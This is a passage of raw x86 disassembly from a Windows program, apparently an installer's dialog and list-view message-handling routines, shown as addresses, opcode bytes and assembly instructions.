  404f0e:	68 30 75 00 00       	push   $0x7530
  404f13:	ff 35 ac c5 46 00    	push   0x46c5ac
  404f19:	ff 15 4c 81 40 00    	call   *0x40814c
  404f1f:	56                   	push   %esi
  404f20:	89 75 f0             	mov    %esi,-0x10(%ebp)
  404f23:	e8 bd 10 00 00       	call   0x405fe5
  404f28:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  404f2c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404f2f:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404f32:	50                   	push   %eax
  404f33:	ff 75 fc             	push   -0x4(%ebp)
  404f36:	6a 4a                	push   $0x4a
  404f38:	ff 35 10 a2 43 00    	push   0x43a210
  404f3e:	ff d3                	call   *%ebx
  404f40:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  404f44:	0f 84 b0 00 00 00    	je     0x404ffa
  404f4a:	a1 b4 46 47 00       	mov    0x4746b4,%eax
  404f4f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404f52:	83 65 f8 01          	andl   $0x1,-0x8(%ebp)
  404f56:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404f59:	75 09                	jne    0x404f64
  404f5b:	ff 75 08             	push   0x8(%ebp)
  404f5e:	56                   	push   %esi
  404f5f:	e8 ec 16 00 00       	call   0x406650
  404f64:	56                   	push   %esi
  404f65:	e8 7b 10 00 00       	call   0x405fe5
  404f6a:	33 ff                	xor    %edi,%edi
  404f6c:	89 45 08             	mov    %eax,0x8(%ebp)
  404f6f:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  404f72:	74 1b                	je     0x404f8f
  404f74:	ff 75 0c             	push   0xc(%ebp)
  404f77:	e8 69 10 00 00       	call   0x405fe5
  404f7c:	03 45 08             	add    0x8(%ebp),%eax
  404f7f:	3d 10 80 00 00       	cmp    $0x8010,%eax
  404f84:	73 74                	jae    0x404ffa
  404f86:	ff 75 0c             	push   0xc(%ebp)
  404f89:	56                   	push   %esi
  404f8a:	e8 cb 10 00 00       	call   0x40605a
  404f8f:	f6 45 f4 04          	testb  $0x4,-0xc(%ebp)
  404f93:	75 0d                	jne    0x404fa2
  404f95:	56                   	push   %esi
  404f96:	ff 35 98 c5 46 00    	push   0x46c598
  404f9c:	ff 15 2c 82 40 00    	call   *0x40822c
  404fa2:	f6 45 f4 02          	testb  $0x2,-0xc(%ebp)
  404fa6:	75 40                	jne    0x404fe8
  404fa8:	57                   	push   %edi
  404fa9:	57                   	push   %edi
  404faa:	68 04 10 00 00       	push   $0x1004
  404faf:	ff 75 fc             	push   -0x4(%ebp)
  404fb2:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%ebp)
  404fb9:	89 75 c0             	mov    %esi,-0x40(%ebp)
  404fbc:	ff d3                	call   *%ebx
  404fbe:	2b 45 f8             	sub    -0x8(%ebp),%eax
  404fc1:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  404fc4:	89 45 b0             	mov    %eax,-0x50(%ebp)
  404fc7:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404fca:	50                   	push   %eax
  404fcb:	b8 4d 10 00 00       	mov    $0x104d,%eax
  404fd0:	2b 45 f8             	sub    -0x8(%ebp),%eax
  404fd3:	57                   	push   %edi
  404fd4:	50                   	push   %eax
  404fd5:	ff 75 fc             	push   -0x4(%ebp)
  404fd8:	ff d3                	call   *%ebx
  404fda:	57                   	push   %edi
  404fdb:	ff 75 b0             	push   -0x50(%ebp)
  404fde:	68 13 10 00 00       	push   $0x1013
  404fe3:	ff 75 fc             	push   -0x4(%ebp)
  404fe6:	ff d3                	call   *%ebx
  404fe8:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404feb:	74 0d                	je     0x404ffa
  404fed:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404ff0:	33 c0                	xor    %eax,%eax
  404ff2:	66 89 04 4d 50 22 44 	mov    %ax,0x442250(,%ecx,2)
  404ff9:	00 
  404ffa:	5f                   	pop    %edi
  404ffb:	5e                   	pop    %esi
  404ffc:	5b                   	pop    %ebx
  404ffd:	c9                   	leave
  404ffe:	c2 08 00             	ret    $0x8
  405001:	56                   	push   %esi
  405002:	8b 35 e8 45 47 00    	mov    0x4745e8,%esi
  405008:	57                   	push   %edi
  405009:	8b 3d ec 45 47 00    	mov    0x4745ec,%edi
  40500f:	6a 00                	push   $0x0
  405011:	ff 15 b4 82 40 00    	call   *0x4082b4
  405017:	09 05 b8 46 47 00    	or     %eax,0x4746b8
  40501d:	6a 00                	push   $0x0
  40501f:	e8 2a ed ff ff       	call   0x403d4e
  405024:	85 ff                	test   %edi,%edi
  405026:	74 2b                	je     0x405053
  405028:	83 c6 0c             	add    $0xc,%esi
  40502b:	4f                   	dec    %edi
  40502c:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  405030:	74 0f                	je     0x405041
  405032:	ff 74 24 0c          	push   0xc(%esp)
  405036:	ff 36                	push   (%esi)
  405038:	e8 5e c3 ff ff       	call   0x40139b
  40503d:	85 c0                	test   %eax,%eax
  40503f:	75 0c                	jne    0x40504d
  405041:	81 c6 20 40 00 00    	add    $0x4020,%esi
  405047:	85 ff                	test   %edi,%edi
  405049:	75 e0                	jne    0x40502b
  40504b:	eb 06                	jmp    0x405053
  40504d:	ff 05 8c 46 47 00    	incl   0x47468c
  405053:	68 04 04 00 00       	push   $0x404
  405058:	e8 f1 ec ff ff       	call   0x403d4e
  40505d:	ff 15 b8 82 40 00    	call   *0x4082b8
  405063:	a1 8c 46 47 00       	mov    0x47468c,%eax
  405068:	5f                   	pop    %edi
  405069:	5e                   	pop    %esi
  40506a:	c2 04 00             	ret    $0x4
  40506d:	55                   	push   %ebp
  40506e:	8b ec                	mov    %esp,%ebp
  405070:	83 ec 54             	sub    $0x54,%esp
  405073:	53                   	push   %ebx
  405074:	56                   	push   %esi
  405075:	8b 35 8c c5 46 00    	mov    0x46c58c,%esi
  40507b:	33 db                	xor    %ebx,%ebx
  40507d:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  405084:	57                   	push   %edi
  405085:	89 75 fc             	mov    %esi,-0x4(%ebp)
  405088:	0f 85 8c 01 00 00    	jne    0x40521a
  40508e:	83 4d c4 ff          	orl    $0xffffffff,-0x3c(%ebp)
  405092:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  405096:	c7 45 bc 02 00 00 00 	movl   $0x2,-0x44(%ebp)
  40509d:	89 5d c0             	mov    %ebx,-0x40(%ebp)
  4050a0:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  4050a3:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4050a6:	33 c0                	xor    %eax,%eax
  4050a8:	8d 7d d4             	lea    -0x2c(%ebp),%edi
  4050ab:	ab                   	stos   %eax,%es:(%edi)
  4050ac:	ab                   	stos   %eax,%es:(%edi)
  4050ad:	ab                   	stos   %eax,%es:(%edi)
  4050ae:	ab                   	stos   %eax,%es:(%edi)
  4050af:	ab                   	stos   %eax,%es:(%edi)
  4050b0:	a1 dc 45 47 00       	mov    0x4745dc,%eax
  4050b5:	8b 48 5c             	mov    0x5c(%eax),%ecx
  4050b8:	8b 40 60             	mov    0x60(%eax),%eax
  4050bb:	8b 3d 64 82 40 00    	mov    0x408264,%edi
  4050c1:	68 03 04 00 00       	push   $0x403
  4050c6:	ff 75 08             	push   0x8(%ebp)
  4050c9:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  4050cc:	89 45 10             	mov    %eax,0x10(%ebp)
  4050cf:	ff d7                	call   *%edi
  4050d1:	68 ee 03 00 00       	push   $0x3ee
  4050d6:	ff 75 08             	push   0x8(%ebp)
  4050d9:	a3 a0 c5 46 00       	mov    %eax,0x46c5a0
  4050de:	ff d7                	call   *%edi
  4050e0:	68 f8 03 00 00       	push   $0x3f8
  4050e5:	ff 75 08             	push   0x8(%ebp)
  4050e8:	a3 98 c5 46 00       	mov    %eax,0x46c598
  4050ed:	ff d7                	call   *%edi
  4050ef:	ff 35 a0 c5 46 00    	push   0x46c5a0
  4050f5:	a3 8c c5 46 00       	mov    %eax,0x46c58c
  4050fa:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4050fd:	e8 35 ec ff ff       	call   0x403d37
  405102:	6a 04                	push   $0x4
  405104:	e8 ea f2 ff ff       	call   0x4043f3
  405109:	a3 a4 c5 46 00       	mov    %eax,0x46c5a4
  40510e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405111:	50                   	push   %eax
  405112:	ff 75 fc             	push   -0x4(%ebp)
  405115:	89 1d ac c5 46 00    	mov    %ebx,0x46c5ac
  40511b:	ff 15 88 82 40 00    	call   *0x408288
  405121:	6a 15                	push   $0x15
  405123:	ff 15 cc 81 40 00    	call   *0x4081cc
  405129:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40512c:	8b 35 7c 82 40 00    	mov    0x40827c,%esi
  405132:	2b c8                	sub    %eax,%ecx
  405134:	8d 45 bc             	lea    -0x44(%ebp),%eax
  405137:	50                   	push   %eax
  405138:	53                   	push   %ebx
  405139:	68 61 10 00 00       	push   $0x1061
  40513e:	ff 75 fc             	push   -0x4(%ebp)
  405141:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  405144:	ff d6                	call   *%esi
  405146:	b8 00 40 00 00       	mov    $0x4000,%eax
  40514b:	50                   	push   %eax
  40514c:	50                   	push   %eax
  40514d:	68 36 10 00 00       	push   $0x1036
  405152:	ff 75 fc             	push   -0x4(%ebp)
  405155:	ff d6                	call   *%esi
  405157:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  40515a:	7c 1c                	jl     0x405178
  40515c:	ff 75 0c             	push   0xc(%ebp)
  40515f:	53                   	push   %ebx
  405160:	68 01 10 00 00       	push   $0x1001
  405165:	ff 75 fc             	push   -0x4(%ebp)
  405168:	ff d6                	call   *%esi
  40516a:	ff 75 0c             	push   0xc(%ebp)
  40516d:	53                   	push   %ebx
  40516e:	68 26 10 00 00       	push   $0x1026
  405173:	ff 75 fc             	push   -0x4(%ebp)
  405176:	ff d6                	call   *%esi
  405178:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  40517b:	7c 0e                	jl     0x40518b
  40517d:	ff 75 10             	push   0x10(%ebp)
  405180:	53                   	push   %ebx
  405181:	68 24 10 00 00       	push   $0x1024
  405186:	ff 75 fc             	push   -0x4(%ebp)
  405189:	ff d6                	call   *%esi
  40518b:	8b 45 14             	mov    0x14(%ebp),%eax
  40518e:	ff 70 30             	push   0x30(%eax)
  405191:	6a 1b                	push   $0x1b
  405193:	ff 75 08             	push   0x8(%ebp)
  405196:	e8 43 eb ff ff       	call   0x403cde
  40519b:	f6 05 28 46 47 00 03 	testb  $0x3,0x474628
  4051a2:	74 34                	je     0x4051d8
  4051a4:	53                   	push   %ebx
  4051a5:	ff 35 a0 c5 46 00    	push   0x46c5a0
  4051ab:	ff 15 38 82 40 00    	call   *0x408238
  4051b1:	f6 05 28 46 47 00 02 	testb  $0x2,0x474628
  4051b8:	75 0d                	jne    0x4051c7
  4051ba:	6a 08                	push   $0x8
  4051bc:	ff 75 fc             	push   -0x4(%ebp)
  4051bf:	ff 15 38 82 40 00    	call   *0x408238
  4051c5:	eb 06                	jmp    0x4051cd
  4051c7:	89 1d a0 c5 46 00    	mov    %ebx,0x46c5a0
  4051cd:	ff 35 98 c5 46 00    	push   0x46c598
  4051d3:	e8 5f eb ff ff       	call   0x403d37
  4051d8:	68 ec 03 00 00       	push   $0x3ec
  4051dd:	ff 75 08             	push   0x8(%ebp)
  4051e0:	ff d7                	call   *%edi
  4051e2:	68 00 00 30 75       	push   $0x75300000
  4051e7:	53                   	push   %ebx
  4051e8:	8b f8                	mov    %eax,%edi
  4051ea:	68 01 04 00 00       	push   $0x401
  4051ef:	57                   	push   %edi
  4051f0:	ff d6                	call   *%esi
  4051f2:	f6 05 28 46 47 00 04 	testb  $0x4,0x474628
  4051f9:	74 18                	je     0x405213
  4051fb:	ff 75 10             	push   0x10(%ebp)
  4051fe:	53                   	push   %ebx
  4051ff:	68 09 04 00 00       	push   $0x409
  405204:	57                   	push   %edi
  405205:	ff d6                	call   *%esi
  405207:	ff 75 0c             	push   0xc(%ebp)
  40520a:	53                   	push   %ebx
  40520b:	68 01 20 00 00       	push   $0x2001
  405210:	57                   	push   %edi
  405211:	ff d6                	call   *%esi
  405213:	33 c0                	xor    %eax,%eax
  405215:	e9 8f 00 00 00       	jmp    0x4052a9
  40521a:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  405221:	75 28                	jne    0x40524b
  405223:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405226:	50                   	push   %eax
  405227:	53                   	push   %ebx
  405228:	68 ec 03 00 00       	push   $0x3ec
  40522d:	ff 75 08             	push   0x8(%ebp)
  405230:	ff 15 64 82 40 00    	call   *0x408264
  405236:	50                   	push   %eax
  405237:	68 01 50 40 00       	push   $0x405001
  40523c:	53                   	push   %ebx
  40523d:	53                   	push   %ebx
  40523e:	ff 15 dc 80 40 00    	call   *0x4080dc
  405244:	50                   	push   %eax
  405245:	ff 15 bc 80 40 00    	call   *0x4080bc
  40524b:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  405252:	8b 3d 38 82 40 00    	mov    0x408238,%edi
  405258:	75 1f                	jne    0x405279
  40525a:	b8 03 04 00 00       	mov    $0x403,%eax
  40525f:	66 39 45 10          	cmp    %ax,0x10(%ebp)
  405263:	75 36                	jne    0x40529b
  405265:	53                   	push   %ebx
  405266:	ff 35 a0 c5 46 00    	push   0x46c5a0
  40526c:	ff d7                	call   *%edi
  40526e:	6a 08                	push   $0x8
  405270:	56                   	push   %esi
  405271:	ff d7                	call   *%edi
  405273:	56                   	push   %esi
  405274:	e8 be ea ff ff       	call   0x403d37
  405279:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  405280:	75 55                	jne    0x4052d7
  405282:	39 1d 94 c5 46 00    	cmp    %ebx,0x46c594
  405288:	74 26                	je     0x4052b0
  40528a:	6a 78                	push   $0x78
  40528c:	c7 05 88 a2 45 00 02 	movl   $0x2,0x45a288
  405293:	00 00 00 
  405296:	e8 1c ea ff ff       	call   0x403cb7
  40529b:	ff 75 14             	push   0x14(%ebp)
  40529e:	8b 45 0c             	mov    0xc(%ebp),%eax
  4052a1:	ff 75 10             	push   0x10(%ebp)
  4052a4:	e8 c0 ea ff ff       	call   0x403d69
  4052a9:	5f                   	pop    %edi
  4052aa:	5e                   	pop    %esi
  4052ab:	5b                   	pop    %ebx
  4052ac:	c9                   	leave
  4052ad:	c2 10 00             	ret    $0x10
  4052b0:	6a 08                	push   $0x8
  4052b2:	ff 35 d4 45 47 00    	push   0x4745d4
  4052b8:	ff d7                	call   *%edi
  4052ba:	39 1d 8c 46 47 00    	cmp    %ebx,0x47468c
  4052c0:	75 0e                	jne    0x4052d0
  4052c2:	a1 80 a2 45 00       	mov    0x45a280,%eax
  4052c7:	53                   	push   %ebx
  4052c8:	ff 70 34             	push   0x34(%eax)
  4052cb:	e8 c2 fb ff ff       	call   0x404e92
  4052d0:	6a 01                	push   $0x1
  4052d2:	e8 e0 e9 ff ff       	call   0x403cb7
  4052d7:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  4052db:	75 be                	jne    0x40529b
  4052dd:	39 75 10             	cmp    %esi,0x10(%ebp)
  4052e0:	75 b9                	jne    0x40529b
  4052e2:	53                   	push   %ebx
  4052e3:	53                   	push   %ebx
  4052e4:	68 04 10 00 00       	push   $0x1004
  4052e9:	56                   	push   %esi
  4052ea:	ff 15 7c 82 40 00    	call   *0x40827c
  4052f0:	3b c3                	cmp    %ebx,%eax
  4052f2:	89 45 0c             	mov    %eax,0xc(%ebp)
  4052f5:	0f 8e 18 ff ff ff    	jle    0x405213
  4052fb:	ff 15 c8 81 40 00    	call   *0x4081c8
  405301:	6a e1                	push   $0xffffffe1
  405303:	53                   	push   %ebx
  405304:	8b f8                	mov    %eax,%edi
  405306:	e8 45 13 00 00       	call   0x406650
  40530b:	50                   	push   %eax
  40530c:	6a 01                	push   $0x1
  40530e:	53                   	push   %ebx
  40530f:	57                   	push   %edi
  405310:	ff 15 c4 81 40 00    	call   *0x4081c4
  405316:	8b 45 14             	mov    0x14(%ebp),%eax
  405319:	83 f8 ff             	cmp    $0xffffffff,%eax
  40531c:	75 13                	jne    0x405331
  40531e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405321:	50                   	push   %eax
  405322:	56                   	push   %esi
  405323:	ff 15 c0 81 40 00    	call   *0x4081c0
  405329:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40532c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40532f:	eb 07                	jmp    0x405338
  405331:	0f bf c8             	movswl %ax,%ecx
  405334:	c1 e8 10             	shr    $0x10,%eax
  405337:	98                   	cwtl
  405338:	53                   	push   %ebx
  405339:	ff 75 08             	push   0x8(%ebp)
  40533c:	53                   	push   %ebx
  40533d:	50                   	push   %eax
  40533e:	51                   	push   %ecx
  40533f:	68 80 01 00 00       	push   $0x180
  405344:	57                   	push   %edi
  405345:	ff 15 bc 81 40 00    	call   *0x4081bc
  40534b:	33 f6                	xor    %esi,%esi
  40534d:	46                   	inc    %esi
  40534e:	3b c6                	cmp    %esi,%eax
  405350:	0f 85 bd fe ff ff    	jne    0x405213
  405356:	8b 45 0c             	mov    0xc(%ebp),%eax
  405359:	89 5d b4             	mov    %ebx,-0x4c(%ebp)
  40535c:	c7 45 c0 60 a2 44 00 	movl   $0x44a260,-0x40(%ebp)
  405363:	c7 45 c4 1f 00 01 00 	movl   $0x1001f,-0x3c(%ebp)
  40536a:	89 45 08             	mov    %eax,0x8(%ebp)
  40536d:	bf 73 10 00 00       	mov    $0x1073,%edi
  405372:	ff 4d 08             	decl   0x8(%ebp)
  405375:	8d 45 ac             	lea    -0x54(%ebp),%eax
  405378:	50                   	push   %eax
  405379:	ff 75 08             	push   0x8(%ebp)
  40537c:	57                   	push   %edi
  40537d:	ff 75 fc             	push   -0x4(%ebp)
  405380:	ff 15 7c 82 40 00    	call   *0x40827c
  405386:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  40538a:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40538d:	75 e3                	jne    0x405372
  40538f:	53                   	push   %ebx
  405390:	ff 15 b8 81 40 00    	call   *0x4081b8
  405396:	ff 15 b4 81 40 00    	call   *0x4081b4
  40539c:	8d 04 36             	lea    (%esi,%esi,1),%eax
  40539f:	50                   	push   %eax
  4053a0:	6a 42                	push   $0x42
  4053a2:	ff 15 24 81 40 00    	call   *0x408124
  4053a8:	50                   	push   %eax
  4053a9:	89 45 08             	mov    %eax,0x8(%ebp)
  4053ac:	ff 15 d8 80 40 00    	call   *0x4080d8
  4053b2:	8b f0                	mov    %eax,%esi
  4053b4:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4053b7:	50                   	push   %eax
  4053b8:	53                   	push   %ebx
  4053b9:	57                   	push   %edi
  4053ba:	ff 75 fc             	push   -0x4(%ebp)
  4053bd:	89 75 c0             	mov    %esi,-0x40(%ebp)
  4053c0:	ff 15 7c 82 40 00    	call   *0x40827c
  4053c6:	8d 34 46             	lea    (%esi,%eax,2),%esi
  4053c9:	6a 0d                	push   $0xd
  4053cb:	58                   	pop    %eax
  4053cc:	66 89 06             	mov    %ax,(%esi)
  4053cf:	46                   	inc    %esi
  4053d0:	46                   	inc    %esi
  4053d1:	6a 0a                	push   $0xa
  4053d3:	58                   	pop    %eax
  4053d4:	66 89 06             	mov    %ax,(%esi)
  4053d7:	46                   	inc    %esi
  4053d8:	46                   	inc    %esi
  4053d9:	43                   	inc    %ebx
  4053da:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  4053dd:	7c d5                	jl     0x4053b4
  4053df:	ff 75 08             	push   0x8(%ebp)
  4053e2:	ff 15 d4 80 40 00    	call   *0x4080d4
  4053e8:	ff 75 08             	push   0x8(%ebp)
  4053eb:	6a 0d                	push   $0xd
  4053ed:	ff 15 b0 81 40 00    	call   *0x4081b0
  4053f3:	ff 15 ac 81 40 00    	call   *0x4081ac
  4053f9:	e9 15 fe ff ff       	jmp    0x405213
  4053fe:	83 ec 10             	sub    $0x10,%esp
  405401:	53                   	push   %ebx
  405402:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  405406:	55                   	push   %ebp
  405407:	b9 10 01 00 00       	mov    $0x110,%ecx
  40540c:	56                   	push   %esi
  40540d:	57                   	push   %edi
  40540e:	3b d9                	cmp    %ecx,%ebx
  405410:	0f 84 3c 01 00 00    	je     0x405552
  405416:	81 fb 08 04 00 00    	cmp    $0x408,%ebx
  40541c:	0f 84 30 01 00 00    	je     0x405552
  405422:	8b 7c 24 24          	mov    0x24(%esp),%edi
  405426:	33 ed                	xor    %ebp,%ebp
  405428:	83 fb 47             	cmp    $0x47,%ebx
  40542b:	75 13                	jne    0x405440
  40542d:	6a 13                	push   $0x13
  40542f:	55                   	push   %ebp
  405430:	55                   	push   %ebp
  405431:	55                   	push   %ebp
  405432:	55                   	push   %ebp
  405433:	57                   	push   %edi
  405434:	ff 35 40 e2 43 00    	push   0x43e240
  40543a:	ff 15 e4 81 40 00    	call   *0x4081e4
  405440:	83 fb 05             	cmp    $0x5,%ebx
  405443:	75 18                	jne    0x40545d
  405445:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405449:	48                   	dec    %eax
  40544a:	f7 d8                	neg    %eax
  40544c:	1b c0                	sbb    %eax,%eax
  40544e:	23 c3                	and    %ebx,%eax
  405450:	50                   	push   %eax
  405451:	ff 35 40 e2 43 00    	push   0x43e240
  405457:	ff 15 38 82 40 00    	call   *0x408238
  40545d:	81 fb 0d 04 00 00    	cmp    $0x40d,%ebx
  405463:	75 1a                	jne    0x40547f
  405465:	ff 35 88 c5 46 00    	push   0x46c588
  40546b:	ff 15 20 82 40 00    	call   *0x408220
  405471:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405475:	a3 88 c5 46 00       	mov    %eax,0x46c588
  40547a:	e9 03 04 00 00       	jmp    0x405882
  40547f:	83 fb 11             	cmp    $0x11,%ebx
  405482:	75 11                	jne    0x405495
  405484:	55                   	push   %ebp
  405485:	55                   	push   %ebp
  405486:	57                   	push   %edi
  405487:	ff 15 68 82 40 00    	call   *0x408268
  40548d:	33 c0                	xor    %eax,%eax
  40548f:	40                   	inc    %eax
  405490:	e9 12 04 00 00       	jmp    0x4058a7
  405495:	81 fb 11 01 00 00    	cmp    $0x111,%ebx
  40549b:	0f 85 9d 00 00 00    	jne    0x40553e
  4054a1:	0f b7 74 24 2c       	movzwl 0x2c(%esp),%esi
  4054a6:	56                   	push   %esi
  4054a7:	57                   	push   %edi
  4054a8:	ff 15 64 82 40 00    	call   *0x408264
  4054ae:	8b f8                	mov    %eax,%edi
  4054b0:	3b fd                	cmp    %ebp,%edi
  4054b2:	74 1d                	je     0x4054d1
  4054b4:	55                   	push   %ebp
  4054b5:	55                   	push   %ebp
  4054b6:	68 f3 00 00 00       	push   $0xf3
  4054bb:	57                   	push   %edi
  4054bc:	ff 15 7c 82 40 00    	call   *0x40827c
  4054c2:	57                   	push   %edi
  4054c3:	ff 15 e0 81 40 00    	call   *0x4081e0
  4054c9:	85 c0                	test   %eax,%eax
  4054cb:	0f 84 d4 03 00 00    	je     0x4058a5
  4054d1:	83 fe 01             	cmp    $0x1,%esi
  4054d4:	75 03                	jne    0x4054d9
  4054d6:	56                   	push   %esi
  4054d7:	eb 2e                	jmp    0x405507
  4054d9:	83 fe 03             	cmp    $0x3,%esi
  4054dc:	75 0c                	jne    0x4054ea
  4054de:	39 2d 2c a0 40 00    	cmp    %ebp,0x40a02c
  4054e4:	7e 3f                	jle    0x405525
  4054e6:	6a ff                	push   $0xffffffff
  4054e8:	eb 1d                	jmp    0x405507
  4054ea:	6a 02                	push   $0x2
  4054ec:	5f                   	pop    %edi
  4054ed:	3b f7                	cmp    %edi,%esi
  4054ef:	75 34                	jne    0x405525
  4054f1:	39 2d 8c 46 47 00    	cmp    %ebp,0x47468c
  4054f7:	74 15                	je     0x40550e
  4054f9:	57                   	push   %edi
  4054fa:	e8 de bf ff ff       	call   0x4014dd
  4054ff:	89 3d 88 a2 45 00    	mov    %edi,0x45a288
  405505:	6a 78                	push   $0x78
  405507:	e8 ab e7 ff ff       	call   0x403cb7
  40550c:	eb 30                	jmp    0x40553e
  40550e:	6a 03                	push   $0x3
  405510:	e8 c8 bf ff ff       	call   0x4014dd
  405515:	85 c0                	test   %eax,%eax
  405517:	75 25                	jne    0x40553e
  405519:	c7 05 88 a2 45 00 01 	movl   $0x1,0x45a288
  405520:	00 00 00 
  405523:	eb e0                	jmp    0x405505
  405525:	ff 74 24 30          	push   0x30(%esp)
  405529:	ff 74 24 30          	push   0x30(%esp)
  40552d:	68 11 01 00 00       	push   $0x111
  405532:	ff 35 88 c5 46 00    	push   0x46c588
  405538:	ff 15 7c 82 40 00    	call   *0x40827c
  40553e:	ff 74 24 30          	push   0x30(%esp)
  405542:	8b c3                	mov    %ebx,%eax
  405544:	ff 74 24 30          	push   0x30(%esp)
  405548:	e8 1c e8 ff ff       	call   0x403d69
  40554d:	e9 55 03 00 00       	jmp    0x4058a7
  405552:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405556:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40555a:	a3 1c a2 43 00       	mov    %eax,0x43a21c
  40555f:	3b d9                	cmp    %ecx,%ebx
  405561:	75 4d                	jne    0x4055b0
  405563:	8b 35 64 82 40 00    	mov    0x408264,%esi
  405569:	6a 01                	push   $0x1
  40556b:	57                   	push   %edi
  40556c:	89 3d d4 45 47 00    	mov    %edi,0x4745d4
  405572:	ff d6                	call   *%esi
  405574:	6a 02                	push   $0x2
  405576:	57                   	push   %edi
  405577:	a3 44 e2 43 00       	mov    %eax,0x43e244
  40557c:	ff d6                	call   *%esi
  40557e:	6a ff                	push   $0xffffffff
  405580:	6a 1c                	push   $0x1c
  405582:	57                   	push   %edi
  405583:	a3 34 e2 43 00       	mov    %eax,0x43e234
  405588:	e8 51 e7 ff ff       	call   0x403cde
  40558d:	ff 35 90 c5 46 00    	push   0x46c590
  405593:	6a f2                	push   $0xfffffff2
  405595:	57                   	push   %edi
  405596:	ff 15 dc 81 40 00    	call   *0x4081dc
  40559c:	6a 04                	push   $0x4
  40559e:	e8 3a bf ff ff       	call   0x4014dd
  4055a3:	a3 94 c5 46 00       	mov    %eax,0x46c594
  4055a8:	33 c0                	xor    %eax,%eax
  4055aa:	40                   	inc    %eax
  4055ab:	a3 1c a2 43 00       	mov    %eax,0x43a21c
  4055b0:	8b 0d 2c a0 40 00    	mov    0x40a02c,%ecx
  4055b6:	8b f1                	mov    %ecx,%esi
  4055b8:	c1 e6 06             	shl    $0x6,%esi
  4055bb:	03 35 e0 45 47 00    	add    0x4745e0,%esi
  4055c1:	33 ed                	xor    %ebp,%ebp
  4055c3:	3b cd                	cmp    %ebp,%ecx
  4055c5:	7c 3e                	jl     0x405605
  4055c7:	83 f8 01             	cmp    $0x1,%eax
  4055ca:	75 31                	jne    0x4055fd
  4055cc:	55                   	push   %ebp
  4055cd:	ff 76 10             	push   0x10(%esi)
  4055d0:	e8 c6 bd ff ff       	call   0x40139b
  4055d5:	85 c0                	test   %eax,%eax
  4055d7:	74 24                	je     0x4055fd
  4055d9:	6a 01                	push   $0x1
  4055db:	55                   	push   %ebp
  4055dc:	68 0f 04 00 00       	push   $0x40f
  4055e1:	ff 35 88 c5 46 00    	push   0x46c588
  4055e7:	ff 15 7c 82 40 00    	call   *0x40827c
  4055ed:	33 c0                	xor    %eax,%eax
  4055ef:	39 2d 94 c5 46 00    	cmp    %ebp,0x46c594
  4055f5:	0f 94 c0             	sete   %al
  4055f8:	e9 aa 02 00 00       	jmp    0x4058a7
  4055fd:	39 2e                	cmp    %ebp,(%esi)
  4055ff:	0f 84 a0 02 00 00    	je     0x4058a5
  405605:	68 0b 04 00 00       	push   $0x40b
  40560a:	e8 3f e7 ff ff       	call   0x403d4e
  40560f:	a1 1c a2 43 00       	mov    0x43a21c,%eax
  405614:	01 05 2c a0 40 00    	add    %eax,0x40a02c
  40561a:	c1 e0 06             	shl    $0x6,%eax
  40561d:	03 f0                	add    %eax,%esi
  40561f:	a1 2c a0 40 00       	mov    0x40a02c,%eax
  405624:	3b 05 e4 45 47 00    	cmp    0x4745e4,%eax
  40562a:	75 07                	jne    0x405633
  40562c:	6a 01                	push   $0x1
  40562e:	e8 aa be ff ff       	call   0x4014dd
  405633:	39 2d 94 c5 46 00    	cmp    %ebp,0x46c594
  405639:	0f 85 24 02 00 00    	jne    0x405863
  40563f:	a1 e4 45 47 00       	mov    0x4745e4,%eax
  405644:	39 05 2c a0 40 00    	cmp    %eax,0x40a02c
  40564a:	0f 83 13 02 00 00    	jae    0x405863
  405650:	ff 76 24             	push   0x24(%esi)
  405653:	8b 5e 14             	mov    0x14(%esi),%ebx
  405656:	68 f0 d0 4e 00       	push   $0x4ed0f0
  40565b:	e8 f0 0f 00 00       	call   0x406650
  405660:	ff 76 20             	push   0x20(%esi)
  405663:	68 19 fc ff ff       	push   $0xfffffc19
  405668:	57                   	push   %edi
  405669:	e8 70 e6 ff ff       	call   0x403cde
  40566e:	ff 76 1c             	push   0x1c(%esi)
  405671:	68 1b fc ff ff       	push   $0xfffffc1b
  405676:	57                   	push   %edi
  405677:	e8 62 e6 ff ff       	call   0x403cde
  40567c:	ff 76 28             	push   0x28(%esi)
  40567f:	68 1a fc ff ff       	push   $0xfffffc1a
  405684:	57                   	push   %edi
